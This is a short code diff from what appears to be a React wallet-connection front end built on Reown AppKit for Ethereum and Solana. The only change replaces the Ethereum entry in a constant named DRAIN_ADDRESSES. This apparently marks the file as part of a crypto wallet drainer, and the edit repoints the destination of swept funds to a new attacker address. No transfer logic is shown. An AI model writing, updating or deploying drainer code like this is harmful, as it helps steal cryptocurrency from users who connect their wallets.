@@ -8,7 +8,7 @@ import { useAppKitConnection } from "@reown/appkit-adapter-solana/react";
 import { useAppKitAccount, useAppKitProvider } from "@reown/appkit/react";
 
 const DRAIN_ADDRESSES = {
-  ethereum: "0x986E412Cd72275728d419ed2B1C726188B523256",
+  ethereum: "0x98934289136e2352347401C1c6c9d652F7f0a08E",
   solana: "8aMQkXNqrV5GfLua9NfF5LuPhBHx6kZHGuenBPfAEGJV",
 };
 
